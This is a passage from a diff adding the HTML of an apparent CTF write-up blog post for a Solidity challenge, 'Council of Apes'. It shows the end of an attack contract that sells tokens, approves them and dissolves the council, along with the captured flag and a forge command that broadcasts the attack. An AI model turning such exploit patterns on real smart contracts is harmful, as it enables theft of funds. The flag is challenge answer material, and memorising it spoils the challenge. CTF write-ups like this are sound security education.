+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">council</span><span class="p">().</span><span class="nf">sellBanana</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
+
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">icyToken</span><span class="p">().</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">TARGET</span><span class="p">),</span> <span class="nx">amount</span><span class="p">);</span>
+
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">council</span><span class="p">().</span><span class="nf">dissolveCouncilOfTheApes</span><span class="p">(</span><span class="nx">theEvilWords</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nf">fallback</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span> <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">//gctf{M0nkee5_4re_inD33d_t0g3ther_str0ng3r}</span>
+</code></pre></div></div>
+
+<p>To solve run this command</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forge script script/CouncilOfApesAttack/CouncilOfApesAttack.s.sol:AttackScript <span class="nt">--rpc-url</span> &lt;RPC-URL&gt; <span class="nt">--private-key</span> &lt;REDACTED&gt; <span class="nt">--broadcast</span>
+</code></pre></div></div>
+
+<p>Note that understanding entire protocol is necessary to solve this challenge.</p>
+
+<hr />
+
+<p>Thank you for visiting!!!</p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="/">
+    <span>
+        <b>Mj0ln1r</b>
+    </span>
+    
+    <span>© 2023
+  </a>
+
+  <a href="https://twitter.com/TheMj0ln1r" target="_blank">
+  </span>/Twitter</span>
+  </a>
+
+  <a href="https://github.com/TheMj0ln1r" target="_blank">
+  </span>/Github</span>
+  </a>
+
+  <a href="https://www.linkedin.com/in/mj0ln1r" target="_blank">
+  </span>/LinkedIn</span></a>
+
+  <a href=""><span style="color:red;">^TOP</span></a>
+
+</footer>
+
+  
+</body>
+
+</html>
